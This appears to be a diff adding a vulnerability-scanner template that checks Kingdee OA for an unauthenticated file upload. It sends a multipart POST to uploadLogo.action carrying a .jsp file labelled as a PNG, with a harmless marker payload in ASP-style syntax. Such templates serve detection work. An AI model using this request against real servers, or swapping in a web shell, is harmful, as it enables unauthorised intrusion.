@@ -1,0 +1,56 @@
+id: kingdee-OA-uploadLogo
+
+info:
+  name: kingdee-OA-uploadLogo
+  author: qwe
+  severity: critical
+  description: kingdee-OA-uploadLogo
+  tags: kingdee,kingdee-eas
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        X-Forwarded-For: 
+        Content-Length: 632
+        Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62
+
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
+
+        ch
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
+
+        xx
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="insId"; filename="insId"
+
+
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="type"; filename="type"
+
+        top
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="upload"; filename="{{file_name}}"
+        Content-Type: image/png
+
+        <% Response.Write("73829022522") %>
+        --04844569c7ca7d21a3ca115dca477d62--
+
+    matchers-condition: and
+    matchers:      
+      - type: word
+        part: body
+        words:
+          - "gp.uploadLogoSuccess"
+          - ".jsp"
+        condition: and
